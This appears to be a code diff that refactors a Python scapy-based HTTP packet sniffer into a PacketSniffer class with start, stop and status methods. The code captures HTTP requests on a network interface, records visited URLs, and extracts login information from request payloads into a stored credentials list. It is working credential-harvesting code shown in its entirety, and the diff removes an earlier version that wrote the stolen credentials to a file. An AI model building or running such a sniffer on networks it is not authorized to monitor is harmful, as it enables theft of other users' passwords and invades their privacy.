@@ -8,15 +8,6 @@ from scapy.layers.http import HTTPRequest
 from scapy.sendrecv import AsyncSniffer
 
 
-# TODO: Turn packet_sniffer into a class PacketSniffer. It will solve problems with output communication.
-# TODO (optional): Maybe extend based on Async Sniffer?
-class PacketSniffer(AsyncSniffer):
-    def __init__(self, *args, **kwargs):
-        super().__init__(*args, **kwargs)
-        self.console_output = []
-        self.credentials = []
-
-
 def get_url(packet):
     return (packet[HTTPRequest].Host + packet[HTTPRequest].Path).decode(errors="ignore")
 
@@ -30,26 +21,26 @@ def get_login_info(packet):
             return load
 
 
-# TODO: store in variable, send variable to main kivy loop.
-def write_log_entry(entry):
-    with open("data/sniffing_log.txt", "a") as log_file:
-        log_file.write(entry + "\n")
+class PacketSniffer:
+    def __init__(self, interface="eth0"):
+        self.console_output = []
+        self.credentials = []
+        self.async_sniffer = AsyncSniffer(iface=interface, store=False, prn=self.process_sniffed_packet)
 
+    def process_sniffed_packet(self, packet):
+        if packet.haslayer(HTTPRequest):
+            url = get_url(packet)
+            self.console_output.append(url)
+            login_info = get_login_info(packet)
+            if login_info:
+                self.console_output.append(login_info)
+                self.credentials.append(login_info)
 
-def write_credentials_entry(entry):
-    with open("data/sniffing_credentials.txt", "a") as log_file:
-        log_file.write(entry + "\n")
+    def start_sniffer(self):
+        self.async_sniffer.start()
 
+    def stop_sniffer(self):
+        self.async_sniffer.stop()
 
-def process_sniffed_packet(packet):
-    if packet.haslayer(HTTPRequest):
-        url = get_url(packet)
-        write_log_entry(url)
-        login_info = get_login_info(packet)
-        if login_info:
-            write_log_entry(login_info)
-            write_credentials_entry(login_info)
-
-
-def create_sniffer(interface: str = "eth0") -> AsyncSniffer:
-    return AsyncSniffer(iface=interface, store=False, prn=process_sniffed_packet)
+    def is_running(self):
+        return self.async_sniffer.running
